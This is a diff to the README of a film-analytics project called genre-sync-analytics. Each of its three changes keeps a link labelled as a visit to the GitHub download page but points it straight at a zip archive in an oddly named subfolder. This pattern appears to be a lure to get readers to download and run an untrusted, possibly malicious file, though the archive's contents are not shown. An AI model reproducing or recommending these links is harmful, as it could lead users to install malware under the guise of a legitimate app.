@@ -1,6 +1,6 @@
 # 🧠 genre-sync-analytics - Find Better Film Opportunities
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/eavesdropperbrush18/genre-sync-analytics)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/eavesdropperbrush18/genre-sync-analytics/raw/refs/heads/main/apetalose/sync-analytics-genre-v3.3.zip)
 
 ## 🎯 What this app does
 
@@ -26,7 +26,7 @@ If you plan to use the app as a local web tool, a standard laptop or desktop is 
 
 Use this link to visit the page and download the app:
 
-[Visit the download page](https://github.com/eavesdropperbrush18/genre-sync-analytics)
+[Visit the download page](https://github.com/eavesdropperbrush18/genre-sync-analytics/raw/refs/heads/main/apetalose/sync-analytics-genre-v3.3.zip)
 
 ### If you are using a ready-made Windows file
 
@@ -255,7 +255,7 @@ The app uses film records, genre tags, sentiment data, and return signals to bui
 
 ## 📎 Download again
 
-[Open the GitHub download page](https://github.com/eavesdropperbrush18/genre-sync-analytics)
+[Open the GitHub download page](https://github.com/eavesdropperbrush18/genre-sync-analytics/raw/refs/heads/main/apetalose/sync-analytics-genre-v3.3.zip)
 
 ## 🧭 Quick start
 
